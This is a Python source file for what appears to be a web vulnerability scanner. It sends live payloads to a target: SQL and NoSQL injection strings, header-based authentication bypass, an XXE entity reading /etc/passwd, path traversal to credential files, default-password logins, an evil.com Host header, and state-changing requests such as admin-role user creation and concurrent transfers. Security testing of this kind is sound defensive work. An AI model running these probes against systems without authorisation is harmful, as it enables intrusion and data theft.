"""Advanced vulnerability checks - comprehensive security assessment"""
import requests
import json
import time

class AdvancedSecurityChecks:
    """Additional vulnerability patterns for comprehensive assessment."""
    
    def __init__(self, url: str, timeout: int = 3):
        self.url = url.rstrip("/")
        self.timeout = timeout
    
    def check_input_validation(self):
        """Test input validation (fuzzing, boundary conditions)."""
        findings = []
        try:
            # SQL/NoSQL injection
            payloads = [
                {"id": "1' OR '1'='1"},
                {"query": "{$ne: null}"},
                {"input": "x' UNION SELECT NULL--"},
                {"filter": "admin=true"},
            ]
            
            for payload in payloads:
                r = requests.post(f"{self.url}/api/search", json=payload, timeout=self.timeout)
                if r.status_code == 200 and len(r.text) > 100:
                    findings.append({
                        "type": "INJECTION_POSSIBLE",
                        "severity": "HIGH",
                        "vector": list(payload.keys())[0]
                    })
                    break
        except:
            pass
        return findings
    
    def check_auth_bypass(self):
        """Authentication bypass vectors."""
        findings = []
        try:
            # Header injection
            headers = {
                "Authorization": "Bearer x' OR '1'='1",
                "X-API-Key": "x' OR '1'='1",
                "X-Admin": "true",
                "X-User-Role": "admin"
            }
            
            r = requests.get(f"{self.url}/api/admin", headers=headers, timeout=self.timeout)
            if r.status_code == 200:
                findings.append({
                    "type": "AUTH_HEADER_BYPASS",
                    "severity": "CRITICAL",
                    "message": "Admin access via header injection"
                })
        except:
            pass
        return findings
    
    def check_privilege_escalation(self):
        """Authorization bypass / privilege escalation."""
        findings = []
        try:
            # Test parameter tampering for privilege escalation
            r = requests.get(f"{self.url}/api/users/admin", timeout=self.timeout)
            if r.status_code == 200:
                findings.append({
                    "type": "DIRECT_OBJECT_REFERENCE",
                    "severity": "HIGH",
                    "message": "Direct admin object access possible"
                })
            
            # Test role parameter
            r = requests.post(f"{self.url}/api/user/create",
                            json={"username": "test", "role": "admin"},
                            timeout=self.timeout)
            if r.status_code in (200, 201):
                findings.append({
                    "type": "PRIVILEGE_ESCALATION_PARAM",
                    "severity": "CRITICAL",
                    "message": "Role parameter unsanitized"
                })
        except:
            pass
        return findings
    
    def check_information_disclosure(self):
        """Stack traces, debug info, error messages."""
        findings = []
        try:
            # Trigger errors to check for disclosure
            error_payloads = [
                "/api/invalid",
                "/api/users/999999999",
                "/api/debug",
                "/api/status/error",
                "/api/test?error=true"
            ]
            
            for payload in error_payloads:
                try:
                    r = requests.get(f"{self.url}{payload}", timeout=self.timeout)
                    if r.status_code in (400, 404, 500):
                        if any(keyword in r.text.lower() for keyword in 
                               ["traceback", "stack", "exception", "debug", "error at line"]):
                            findings.append({
                                "type": "INFO_DISCLOSURE",
                                "severity": "MEDIUM",
                                "endpoint": payload
                            })
                            break
                except:
                    pass
        except:
            pass
        return findings
    
    def check_xxe_injection(self):
        """XML External Entity injection."""
        findings = []
        try:
            xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request><input>&xxe;</input></request>'''
            
            r = requests.post(f"{self.url}/api/parse",
                            data=xxe_payload,
                            headers={"Content-Type": "application/xml"},
                            timeout=self.timeout)
            if r.status_code == 200 and "root:" in r.text:
                findings.append({
                    "type": "XXE_INJECTION",
                    "severity": "CRITICAL",
                    "message": "Server parses and processes external entities"
                })
        except:
            pass
        return findings
    
    def check_default_credentials(self):
        """Default/weak credentials."""
        findings = []
        defaults = [
            ("admin", "admin"), ("admin", "password"),
            ("test", "test"), ("root", "root"),
            ("guest", "guest"), ("admin", "12345")
        ]
        
        try:
            for user, pwd in defaults:
                r = requests.post(f"{self.url}/api/login",
                                json={"username": user, "password": pwd},
                                timeout=self.timeout)
                if r.status_code == 200:
                    findings.append({
                        "type": "DEFAULT_CREDENTIALS",
                        "severity": "CRITICAL",
                        "credentials": f"{user}:{pwd}"
                    })
                    break
        except:
            pass
        return findings
    
    def check_cache_poisoning(self):
        """HTTP cache poisoning."""
        findings = []
        try:
            headers = {
                "X-Forwarded-Host": "evil.com",
                "Host": "evil.com"
            }
            r = requests.get(f"{self.url}/api/config", headers=headers, timeout=self.timeout)
            if r.status_code == 200:
                findings.append({
                    "type": "CACHE_POISONING_POSSIBLE",
                    "severity": "HIGH",
                    "message": "Server reflects host header in response"
                })
        except:
            pass
        return findings
    
    def check_race_conditions(self):
        """Concurrent access race conditions."""
        findings = []
        try:
            import threading
            import queue
            
            q = queue.Queue()
            
            def make_request():
                try:
                    r = requests.post(f"{self.url}/api/transfer",
                                    json={"from": "user1", "to": "user2", "amount": 1000},
                                    timeout=self.timeout)
                    q.put(r.status_code)
                except:
                    pass
            
            # Send 5 concurrent requests
            threads = [threading.Thread(target=make_request) for _ in range(5)]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=10)
            
            # If all succeeded, race condition possible
            if q.qsize() == 5:
                findings.append({
                    "type": "RACE_CONDITION_POSSIBLE",
                    "severity": "HIGH",
                    "message": "Concurrent transfers all succeeded"
                })
        except:
            pass
        return findings
    
    def check_bulk_operations(self):
        """API abuse via bulk operations."""
        findings = []
        try:
            # Test bulk endpoint without rate limit
            r = requests.post(f"{self.url}/api/bulk",
                            json={"operations": [{"op": "create", "data": {}} for _ in range(100)]},
                            timeout=self.timeout)
            if r.status_code == 200:
                findings.append({
                    "type": "BULK_OPERATION_ABUSE",
                    "severity": "MEDIUM",
                    "message": "100 bulk operations accepted without limit"
                })
        except:
            pass
        return findings
    
    def check_timing_attacks(self):
        """Timing-based attacks on auth/validation."""
        findings = []
        try:
            import timeit
            
            # Measure response times for valid vs invalid users
            valid_time = timeit.timeit(
                lambda: requests.post(f"{self.url}/api/login",
                                    json={"username": "admin", "password": "wrong"},
                                    timeout=self.timeout).elapsed.total_seconds(),
                number=3
            )
            
            invalid_time = timeit.timeit(
                lambda: requests.post(f"{self.url}/api/login",
                                    json={"username": "nonexistent", "password": "wrong"},
                                    timeout=self.timeout).elapsed.total_seconds(),
                number=3
            )
            
            # If timing differs significantly, user enumeration possible
            if abs(valid_time - invalid_time) > 0.1:
                findings.append({
                    "type": "TIMING_ATTACK_POSSIBLE",
                    "severity": "MEDIUM",
                    "message": f"Valid user takes {valid_time:.3f}s, invalid takes {invalid_time:.3f}s"
                })
        except:
            pass
        return findings
    
    def check_path_traversal_advanced(self):
        """Advanced path traversal techniques."""
        findings = []
        try:
            traversals = [
                "..;/..;/..;/etc/passwd",
                "....\\....\\....\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..\\..\\..\\windows\\win.ini",
                "//etc/passwd",
                "\\etc\\passwd"
            ]
            
            for traversal in traversals:
                r = requests.get(f"{self.url}/download/{traversal}", timeout=self.timeout)
                if r.status_code == 200 and len(r.text) > 50:
                    findings.append({
                        "type": "PATH_TRAVERSAL_ADVANCED",
                        "severity": "CRITICAL",
                        "technique": traversal
                    })
                    break
        except:
            pass
        return findings
    
    def check_graphql_vulns(self):
        """GraphQL-specific vulnerabilities."""
        findings = []
        try:
            r = requests.post(f"{self.url}/graphql",
                            json={"query": "{ __schema { types { name } } }"},
                            timeout=self.timeout)
            if r.status_code == 200:
                findings.append({
                    "type": "GRAPHQL_INTROSPECTION",
                    "severity": "MEDIUM",
                    "message": "GraphQL schema introspection enabled"
                })
        except:
            pass
        return findings
    
    def run(self):
        """Run all advanced checks."""
        all = []
        all.extend(self.check_input_validation())
        all.extend(self.check_auth_bypass())
        all.extend(self.check_privilege_escalation())
        all.extend(self.check_information_disclosure())
        all.extend(self.check_xxe_injection())
        all.extend(self.check_default_credentials())
        all.extend(self.check_cache_poisoning())
        all.extend(self.check_race_conditions())
        all.extend(self.check_bulk_operations())
        all.extend(self.check_timing_attacks())
        all.extend(self.check_path_traversal_advanced())
        all.extend(self.check_graphql_vulns())
        return all
